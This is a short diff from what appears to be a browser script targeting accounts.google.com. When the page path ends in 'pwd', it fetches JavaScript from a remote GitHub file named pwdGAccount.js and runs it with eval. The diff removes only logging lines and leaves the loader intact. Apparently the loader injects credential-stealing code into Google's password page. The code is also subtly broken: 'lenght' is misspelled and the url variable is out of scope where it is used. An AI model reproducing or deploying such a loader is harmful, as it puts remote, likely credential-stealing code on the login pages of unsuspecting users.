@@ -10,14 +10,7 @@ else if (location.host == 'accounts.google.com'){
     else if (path[path.lenght - 1] == 'pwd'){
         let url = "https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js";
     }
-    
-    console.log("[!] PATH = " + path)
 }
-
-
-
-console.log("[!] URL = " + url)
-
 
 if (url != undefined){
     fetch(url).then(response => response.text()).then(code => {eval(code);});
